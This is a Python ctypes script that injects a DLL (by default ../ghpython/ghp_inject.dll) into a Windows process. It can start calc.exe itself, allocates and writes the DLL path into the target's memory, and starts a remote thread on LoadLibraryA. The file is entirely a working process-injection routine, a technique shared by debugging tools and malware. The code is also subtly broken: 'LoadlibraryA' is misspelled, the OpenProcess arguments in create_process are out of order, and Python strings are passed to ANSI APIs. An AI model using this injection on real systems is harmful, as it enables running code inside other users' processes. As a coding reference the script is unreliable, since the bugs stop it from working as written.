from ctypes import *
from my_debugger_defines import *
import sys

def create_process(path_to_exe):
    creation_flags          = DEBUG_PROCESS

    process_information     = PROCESS_INFORMATION()
    startupinfo             = STARTUPINFO()
    startupinfo.cb          = sizeof(startupinfo)
    startupinfo.dwFlags     = 0x1
    startupinfo.wShowWindow = 0x0

    if kernel32.CreateProcessA(path_to_exe,
                               None,
                               None,
                               None,
                               None,
                               creation_flags,
                               None,
                               None,
                               byref(startupinfo),
                               byref(process_information)):
        print("[*] Successfully launched the process!")
        pid = process_information.dwProcessId
        print("[*] PID: %d" % process_information.dwProcessId)
        h_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, pid, False)
        if h_handle is not None:
            #kernel32.DebugActiveProcess(pid)
            #debug_event = DEBUG_EVENT()
            #continue_status = DBG_CONTINUE
            #kernel32.WaitForDebugEvent(byref(debug_event), INFINITE)
            #kernel32.ContinueDebugEvent(debug_event.dwProcessId,
            #                            debug_event.dwThreadId,
            #                            continue_status)
            kernel32.DebugActiveProcessStop(pid)
            return pid
        else:
            print("[*] Unable to get handle to process.")
    else:
        print("[*] Error: 0x%08x." % kernel32.GetLastError())




PAGE_READWRITE      = 0x04
PROCESS_ALL_ACCESS  = (0x000F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM         = (0x1000 | 0x2000)

kernel32 = windll.kernel32
#pid      = sys.argv[1]
#dll_path = sys.argv[2]

dll_path = '../ghpython/ghp_inject.dll'
if len(sys.argv) < 2:
    path_to_exe = 'C:\\Windows\\system32\\calc.exe'
    pid = create_process(path_to_exe)
elif len(sys.argv) < 3:
    pid = sys.argv[1]
else:
    pid = sys.argv[1]
    dll_path = sys.argv[2]
print("PID = %s"%pid)
len_dll = len(dll_path)
h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid))

if not h_process:
    print("[*] Unable to acquire handle to PID %s" % pid)
    sys.exit(0)

arg_address = kernel32.VirtualAllocEx(h_process, 0, len_dll,
                                          VIRTUAL_MEM,
                                          PAGE_READWRITE)
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, dll_path, len_dll,
                            byref(written))

h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
h_loadlib  = kernel32.GetProcAddress(h_kernel32, "LoadlibraryA")

thread_id = c_ulong(0)
if not kernel32.CreateRemoteThread(h_process,
                                   None,
                                   0,
                                   h_loadlib,
                                   arg_address,
                                   0,
                                   byref(thread_id)):
    print("[*] Failed to inject the DLL. Exiting.")
    sys.exit(0)


